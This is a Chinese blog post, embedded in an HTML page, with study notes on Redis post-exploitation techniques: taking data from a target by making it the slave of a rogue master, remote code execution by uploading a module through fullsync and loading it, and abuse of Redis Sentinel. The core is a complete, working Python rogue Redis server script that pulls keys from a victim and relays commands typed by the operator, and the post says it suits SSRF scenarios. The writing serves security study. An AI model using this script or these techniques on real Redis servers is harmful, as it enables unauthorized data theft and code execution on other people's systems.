@@ -1,0 +1,379 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no", user-scalable=no">
+  <title>redis-post-exploitation 学习背着键盘去流浪</title>
+  <link rel="shortcut icon" href="">
+  
+    
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+      <link rel="stylesheet" href="/css/font-awesome.min.css">
+    
+      <link rel="stylesheet" href="/css/atom-one-dark.css">
+    
+      <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+    
+      <link rel="stylesheet" href="/css/nprogress.min.css">
+    
+      <link rel="stylesheet" href="/css/valine.css">
+    
+      <link rel="stylesheet" href="/css/life.css">
+    
+  
+
+  
+
+  <!-- jQuery first, then Tether, then Bootstrap JS. -->
+  
+  
+  
+    <script src="/js/jquery-2.2.4.min.js"></script>
+  
+    <script src="https://cdn1.lncld.net/static/js/3.1.0/av-min.js"></script>
+  
+    <script src="/js/jquery.pjax.js"></script>
+  
+    <script src="/js/nprogress.min.js"></script>
+  
+    <script src="/js/tether.min.js"></script>
+  
+    <script src="/js/bootstrap.min.js"></script>
+  
+    <script src="/js/highlight.min.js"></script>
+  
+    <script src="/js/highlightjs-line-numbers.min.js"></script>
+  
+    <script src="/js/jquery.fancybox.js"></script>
+  
+    <script src="/js/jquery.qrcode.min.js"></script>
+  
+    <script src="/js/Valine.min.js"></script>
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<script>AV.init({appId:'',appKey:''});</script>
+<script type="text/javascript">
+      var config = {
+            ClasS: 'Counter',
+            el:'.views',
+            elP: '.views-post'
+      }
+</script>
+<div class="container">
+    <div class="row blog-box-shadow">
+        <!--博客主栏开始-->
+        <div class="col-xl-9 col-lg-12 blog-main" id="pjax-box">
+            <header class="blog-header">
+                <a href="http://justfortest.cc" class="blog-header-mobile-title">背着键盘去流浪</a>
+                <a href="javascript:;" class="blog-header-navbar-btn"><i class="fa fa-bars"></i></a>
+                <nav class="blog-header-navbar blog-header-fixed">
+                    <ul class="blog-navbar-links">
+                        
+                          <li class="blog-nav-item"><a href="/" class="transition">首页</a></li>
+                        
+                          <li class="blog-nav-item"><a href="/about/" class="transition">关于</a></li>
+                        
+                        <div class="blog-navbar-right">
+                            <form action="">
+                                <div class="input-group">
+                                    <input type="text" class="blog-header-search" placeholder="search...">
+                                    <buttn type="submit" class="blog-header-search-btn"><i class="fa fa-search"></i></buttn>
+                                </div>
+                            </form>
+                        </div>
+                    </ul>
+                </nav>
+            </header>
+                
+<header class="blog-post-page-title">
+    <h4>redis-post-exploitation 学习</h4>
+    <time datetime="2019-07-14T04:00:00.000Z"><i class="fa fa-clock-o"></i>2019-07-14</time>
+    
+    
+    
+    
+	
+    
+</header>
+<div class="blog-main-post blog-post-page-box">
+    <article class="blog-post-block blog-post-page-content">
+        <section>
+            
+                <h3 id="redis-post-exploitation-学习"><a href="#redis-post-exploitation-学习" class="headerlink" title="redis-post-exploitation 学习"></a>redis-post-exploitation 学习</h3><p><a href="/2019/07/14/redis-post-exploitation-%E5%AD%A6%E4%B9%A0/">2019-07-14</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><a href="#%E7%AE%80%E4%BB%8B" title="简介"></a>简介</h2><p>前两天Redis通过加载扩展实现RCE的方法突然火了起来,自己就去读了下原文ppt,发现里面不止写了RCE的利用,还附带了一些其他的就学习了一下。</p>
+<h2 id="Data-Retrieval"><a href="#Data-Retrieval" class="headerlink" title="Data Retrieval"></a><a href="#Data-Retrieval" title="Data Retrieval"></a>Data Retrieval</h2><p>该利用实现方法为将目标Redis设置为Rogue的slave数据库,通过rogue向slave发送命令获取数据。这个主要存在几个问题, 一是当目标Redis被设置为一台新redis的slave后会自动进行fullsync,导致目标Redis的原数据被清除。二是master如何给slave发命令, 查了下文档并没有找到主动发命令的方法。三是,slave的数据如何返回到master中。<br>第一个问题比较好解决,自己搭建Rogue后只要slave发送sync请求时返回CONTINUE即可实现不清空slave的数据。</p>
+<p>1<br>2<br>3  </p>
+<p>elif cmd_arr[0].startswith(“PSYNC”) or cmd_arr[0].startswith(“SYNC”):<br> resp &#x3D; “+CONTINUE “ + “Z” * 40 + “ 0” + CLRF<br> phase &#x3D; 3  </p>
+<p>第二个问题,文档里没有翻到master给slave发命令的指令, 但是在同步完成后master是可以给slave返回命令执行的。</p>
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19  </p>
+<p> if ((replication_cron_loops % server.repl_ping_slave_period) &#x3D;&#x3D; 0 &amp;&amp;<br> listLength(server.slaves))<br>{<br> &#x2F;* Note that we don’t send the PING if the clients are paused during<br> * a Redis Cluster manual failover: the PING we send will otherwise<br> * alter the replication offsets of master and slave, and will no longer<br> * match the one stored into ‘mf_master_offset’ state. *&#x2F;<br> int manual_failover_in_progress &#x3D;<br> server.cluster_enabled &amp;&amp;<br> server.cluster-&gt;mf_end &amp;&amp;<br> clientsArePaused();  </p>
+<p> if (!manual_failover_in_progress) {<br> ping_argv[0] &#x3D; createStringObject(“PING”,4);<br> replicationFeedSlaves(server.slaves, server.slaveseldb,<br> ping_argv, 1);<br> decrRefCount(ping_argv[0]);<br> }<br>}  </p>
+<p>从代码里看出,在同步完成后写死了只会返回PING,所以这里自己搭建Rogue返回任意指令即可。<br>第三个问题,在开启调试模式之后会返回数据到Master中, 所以按照PPT里的流程编写Rogue即可。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_1.jpg" alt="-w1067"></p>
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126  </p>
+<p>import socket<br>import time  </p>
+<p>CLRF &#x3D; “\r\n”  </p>
+<p>def din(sock, cnt&#x3D;4096):<br> global verbose<br> msg &#x3D; sock.recv(cnt)  </p>
+<p> return msg.decode(‘gb18030’)  </p>
+<p>def dout(sock, msg):<br> global verbose<br> if type(msg) !&#x3D; bytes:<br> msg &#x3D; msg.encode()<br> sock.send(msg)  </p>
+<p>def encode_cmd_arr(arr):<br> cmd &#x3D; “”<br> cmd +&#x3D; “*“ + str(len(arr))<br> for arg in arr:<br> cmd +&#x3D; CLRF + “$” + str(len(arg))<br> cmd +&#x3D; CLRF + arg<br> cmd +&#x3D; “\r\n”<br> return cmd  </p>
+<p>def encode_cmd(raw_cmd):<br> return encode_cmd_arr(raw_cmd.split(“ “))  </p>
+<p>def decode_cmd(cmd):<br> if cmd.startswith(“*“):<br> raw_arr &#x3D; cmd.strip().split(“\r\n”)<br> return raw_arr[2::2]<br> if cmd.startswith(“$”):<br> return cmd.split(“\r\n”, 2)[1]<br> return cmd.strip().split(“ “)  </p>
+<p>class Remote:<br> def __init__(self, rhost, rport):<br> self._host &#x3D; rhost<br> self._port &#x3D; rport<br> self._sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br> self._sock.connect((self._host, self._port))  </p>
+<p> def send(self, msg):<br> dout(self._sock, msg)  </p>
+<p> def recv(self, cnt&#x3D;65535):<br> return din(self._sock, cnt)  </p>
+<p> def do(self, cmd):<br> self.send(encode_cmd(cmd))<br> buf &#x3D; self.recv()<br> return buf  </p>
+<p>class RogueServer:<br> def __init__(self, lhost, lport):<br> self._host &#x3D; lhost<br> self._port &#x3D; lport<br> self._sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br> self._sock.bind((‘0.0.0.0’, self._port))<br> self._sock.listen(10)<br> self.i &#x3D; 0  </p>
+<p> def close(self):<br> self._sock.close()  </p>
+<p> def handle(self, data):<br> cmd_arr &#x3D; decode_cmd(data)<br> resp &#x3D; “”<br> phase &#x3D; 0<br> # print(data)<br> if cmd_arr[0].startswith(“PING”):<br> resp &#x3D; “+PONG” + CLRF<br> phase &#x3D; 1<br> elif ‘ACK’ in data:<br> if self.i % 3 &#x3D;&#x3D; 0:<br> payload &#x3D; “SCRIPT DEBUG SYNC”<br> resp &#x3D; encode_cmd(payload)<br> elif self.i % 3 &#x3D;&#x3D; 1:<br> payload &#x3D; “eval redis.breakpoint() 0”<br> resp &#x3D; encode_cmd(payload)<br> phase &#x3D; 4<br> else:<br> payload &#x3D; “r keys *“<br> resp &#x3D; encode_cmd(payload)<br> self.i +&#x3D; 1  </p>
+<p> elif cmd_arr[0].startswith(“REPLCONF”):<br> resp &#x3D; “+OK” + CLRF<br> phase &#x3D; 2<br> elif cmd_arr[0].startswith(“PSYNC”) or cmd_arr[0].startswith(“SYNC”):<br> resp &#x3D; “+CONTINUE “ + “Z” * 40 + “ 0” + CLRF<br> phase &#x3D; 3<br> return resp, phase  </p>
+<p> def exp(self):<br> cli, addr &#x3D; self._sock.accept()<br> while True:<br> data &#x3D; din(cli, 1024)<br> if len(data) &#x3D;&#x3D; 0:<br> print(“data &#x3D;&#x3D; 0”)<br> break<br> resp, phase &#x3D; self.handle(data)  </p>
+<p> if phase &#x3D;&#x3D; 4:<br> dout(cli, resp)<br> data &#x3D; din(cli, 1024)<br> # payload &#x3D; raw_input(“Commands:”)  </p>
+<p> payload &#x3D; “r keys *“<br> while True:<br> time.sleep(1)<br> payload &#x3D; input(“[*]Master to Slave Command:”)<br> if payload &#x3D;&#x3D; ‘exit’:<br> break<br> resp &#x3D; encode_cmd(payload)<br> dout(cli, resp)<br> data &#x3D; din(cli, 1024)<br> print(data)<br> break<br> else:<br> dout(cli, resp)  </p>
+<p>RogueServer(“127.0.0.1”, 9990).exp()  </p>
+<p>该方法在redis bind到127,SSRF且无回显的场景中可以快速拿到数据库中的所有数据.<br>Docker中的redis bind到127进行测试.<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_2.jpg" alt="-w1238"></p>
+<p>P.S.<br>PPT中提到的redis5版本后不能使用config命令, 说的是在script模式中不能使用config,正常模式下能够正常使用,看到有不少人理解错了顺便说一下。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_3.jpg" alt="-w1201"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><a href="#RCE" title="RCE"></a>RCE</h2><p>redis4中新增了添加扩展功能,可以自己编译so load到redis中使用。如果能够上传编译好的so到redis服务器中,即可通过module load加载扩展实现RCE。在以前的利用中，是通过持久化数据到crontab或authorized_keys或web目录中,但是这种方法有很大的一个问题是我们不能完全控制文件内容。<br>Redis在进行fullsync时, 会把master返回的数据直接保存到临时文件中,然后再重命名为dbfilename对应的文件名, 这里自己自己搭建rogue server,即可返回任意内容实现任意文件上传,然后写入so即可实现RCE。</p>
+<p>1<br>2<br>3<br>4<br>5  </p>
+<p>if (rename(server.repl_transfer_tmpfile,server.rdb_filename) &#x3D;&#x3D; -1) {<br> serverLog(LL_WARNING,”Failed trying to rename the temp DB into dump.rdb in MASTER &lt;-&gt; SLAVE synchronization: %s”, strerror(errno));<br> cancelReplicationHandshake();<br> return;<br>}  </p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_4.jpg" alt="-w1185"><br>在redis4中, fullsync使用的协议格式为plaintext,而redis5中使用了custom格式。一开始有开源的rogue server直接使用data.startswith(“PSYNC”)来决定返回内容,我测试该脚本能在redis4成功而redis5失败,就是这个原因。</p>
+<p>在进行FULLSYNC时, slave的数据会被完全清空且同步master的数据, 所以在利用时需要做好数据备份。<br>数据备份有两种常用的方法, 一是在利用前先save,在RCE后重启redis即可。二是创建一个公网redis,利用前将目标数据同步到公网redis中,利用完后目标REDIS再从公网redis中同步数据,这样不需要重启。</p>
+<h2 id="redis-sentinel"><a href="#redis-sentinel" class="headerlink" title="redis-sentinel"></a><a href="#redis-sentinel" title="redis-sentinel"></a>redis-sentinel</h2><p>Sentinel常用来管理多个Redis服务器, 该服务的默认端口为26379, 并且sentinel中不会检测包中是否含有HOST:和POST,所以可以在SSRF中利用。<br>ppt中提到的利用方法为,首先在sentinel中监控大Rogue server, Rogue server中含有两个slave一个为另外的小Rogue server另一个为需要take over的redis。当大Rogue server断线时, Sentinel会从slave中按照slave_priorty等配置来选举出新的master。<br>当小Rogue server成为Master,目标Redis成为了slave后就可以接着使用之前的方法实现RCE。<br>当前还提到了一种更简单的利用方法,当Sentinel存在未授权时，可以使用Sentinel的Notification功能执行任意脚本。不过我测试redis-sentinel默认配置为sentinel deny-scripts-reconfig yes,没法利用。</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a><a href="#References" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a><br><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a><br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+
+            
+        </section>
+        <footer class="blog-post-page-tags">
+        
+			
+		
+        </footer>
+    </article>
+    <article class="blog-post-page-readmore">
+    	
+    	
+		
+			<a href="/2019/10/17/php-resolve-json/" class="blog-post-page-readmore-prev" data-toggle="tooltip" data-placement="top" title="PHP是如何解析JSON的">上一篇</a>
+		
+
+		
+		
+			<a href="/2019/03/27/firstBlog/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="firstBlog">下一篇</a>
+		
+
+        <div style="clear: both;"></div>
+    </article>
+
+    <article class="blog-post-block blog-post-page-content">
+            <div class="row">
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span class="post-comments-btn btn btn-info btn-block" data-toggle="tooltip" data-placement="top" title="本站采用Disqus评论组件，若您没有科学上网可能会无法查看并评论">加载评论</span>
+                </div>
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span  data-toggle="modal" data-target="#post-donate-content">
+                        <span id="post-donate-btn" class="btn btn-danger btn-block" data-toggle="tooltip" data-placement="top" title="如果您觉得本文还不错或者对您有帮助，可以考虑打赏一下作者哦">打赏本文</span>
+                    </span>
+                </div>
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span  data-toggle="modal" data-target="#post-qrcode-content">
+                        <span><span id="post-qrcode-btn" class="btn btn-success btn-block" data-toggle="tooltip" data-placement="top" title="微信扫描二维码手机端查看本文及分享本文">二维码</span></span>
+                    </span>
+                </div>
+            </div>
+        <div class="post-more-function-br"></div>
+
+        <div class="modal fade" id="post-donate-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">打赏本文</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-donate-content">
+                            <div class="col-md-4">
+                                <p>支付宝</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                            <div class="col-md-4">
+                                <p>微信</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                            <div class="col-md-4">
+                                <p>财付通</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="post-qrcode-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-sm" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">文章二维码</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-qrcode-content">
+                            <span class="post-qrcode-content-canvas"></span>
+                            <img class="post-qrcode-content-img no-lightbox" src=""/>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            // post QRcode
+            // 中文转码
+            function toUtf8(str) {
+                var out, i, len, c;
+                out = "";
+                len = str.length;
+                for (i = 0; i < len; i++) {
+                    c = str.charCodeAt(i);
+                    if ((c >= 0x0001) && (c <= 0x007F)) {
+                        out += str.charAt(i);
+                    } else if (c > 0x07FF) {
+                        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
+                        out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    } else {
+                        out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    }
+                }
+                return out;
+            }
+            // 生成
+            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://justfortest.cc/2019/07/14/redis/")}).hide();
+            var canvas=qrcode.find('canvas').get(0);
+            $('.post-qrcode-content-img').attr('src',canvas.toDataURL('image/jpg'));
+        </script>
+
+        
+    </article>
+    
+</div>
+
+                
+            <footer class="blog-footer">
+                <p class="blog-footer-left">Copyright © 2017 <a href="http://justfortest.cc">背着键盘去流浪</a></p>
+                <p class="blog-footer-right">Powered by <a href="https://hexo.io" target="_blank">Hexo</a>,Themes <a href="https://weic.me/themes-life/" target="_blank">Life</a></p>
+            </footer>
+        </div><!--博客主栏结束-->
+        <!--博客侧边栏开始-->
+        <div class="col-xl-3 blog-sidebar">
+            <div class="blog-sidebar-title">
+                <a href="">背着键盘去流浪</a>
+            </div>
+            <div class="blog-sidebar-logo">
+                <img src="http://i.niupic.com/images/2022/12/30/aepT.png">
+            </div>
+            <div class="blog-sidebar-count blog-sidebar-padding">
+                <div class="blog-sidebar-count-left">
+                    <p class="blog-sidebar-count-p">11</p>
+                    <span class="blog-sidebar-count-span">文章</span>
+                </div>
+                <div class="blog-sidebar-count-right">
+                    <p class="blog-sidebar-count-p">0</p>
+                    <span class="blog-sidebar-count-span">标签</span>
+                </div>
+                <div style="clear: both;"></div>
+            </div>
+            <div class="blog-sidebar-icon blog-sidebar-padding">
+                <ul>
+                    <li><a href="" class="icon-github" target="_blank" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-github"></i></a></li>
+                    <li><a href="" class="icon-weibo" target="_blank" data-toggle="tooltip" data-placement="top" title="新浪微博"><i class="fa fa-weibo"></i></a></li>
+                    <li><a href="" class="icon-twitter" target="_blank" data-toggle="tooltip" data-placement="top" title="Twitter"><i class="fa fa-twitter"></i></a></li>
+                    <!--<li><a href="" class="icon-facebook" target="_blank" data-toggle="tooltip" data-placement="top" title="FaceBook"><i class="fa fa-facebook"></i></a></li>-->
+                    <li><a href="mailto:" class="icon-email" data-toggle="tooltip" data-placement="top" title="E-Mail"><i class="fa fa-envelope"></i></a></li>
+                    <li><a href="" class="icon-rss" data-toggle="tooltip" target="_blank" data-placement="top" title="RSS"><i class="fa fa-rss"></i></a></li>
+                </ul>
+            </div>
+            <div class="blog-sidebar-categories">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-folder-open"></i>&nbsp;文章分类</h4>
+                <ul class="list-group blog-sidebar-padding">
+                  
+                </ul>
+            </div>
+            <div class="blog-sidebar-tags">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-tag"></i>&nbsp;标签云</h4>
+                <ul class="blog-sidebar-tags-ul blog-sidebar-padding">
+                  
+                </ul>
+            </div>
+            <script>
+              // 博客侧栏标签云随机色
+              var tag_cloud = $('.tag-could');
+              tag_cloud.each(function () {
+                  var Cnum = 9;
+                  var Crand = parseInt(Math.random() * Cnum);
+                  $(this).addClass("tag-could" + Crand);
+              })
+            </script>
+            <!--返回顶部按钮-->
+            <div class="retop">
+                <i class="fa fa-angle-up"></i>
+            </div>
+        </div><!--博客侧边栏结束-->
+    </div>
+</div>
+<script src="/js/LeanStatistics.min.js"></script>
+<script src="/js/Life.js"></script>
+<script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+    otherF();
+    LeanStatistics();
+    $(document).pjax('a', '#pjax-box', {fragment:'#pjax-box', timeout:8000}).on('pjax:complete', function() {
+      $('pre code').each(function(i, block){
+        hljs.highlightBlock(block);
+      })
+      $('code.hljs').each(function(i, block) {
+        hljs.lineNumbersBlock(block);
+      });
+      LeanStatistics();
+    }).on('pjax:start', function() { NProgress.start(); }).on('pjax:end',   function() {
+      NProgress.done();
+      otherF();
+    });
+</script>
+</body>
+</html>
